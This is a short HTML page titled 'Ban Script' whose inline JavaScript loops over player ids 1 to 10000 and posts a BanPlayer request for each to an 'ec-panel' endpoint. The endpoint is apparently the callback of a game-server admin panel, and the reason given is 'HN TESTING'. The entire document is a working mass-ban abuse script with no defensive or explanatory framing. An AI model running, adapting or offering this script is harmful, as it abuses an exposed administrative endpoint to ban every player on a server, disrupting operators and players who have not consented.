<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Ban Script</title>
  <!-- jQuery (needed for $.post to work) -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
  <script>
    for (let i = 1; i <= 10000; i++) {
      setTimeout(() => {
        $.post('https://ec-panel/BanPlayer', JSON.stringify({
          id: i,
          Reason: "HN TESTING"
        }));
      }, i * 50); // 50ms delay between each request.
    }
  </script>
</body>
</html>
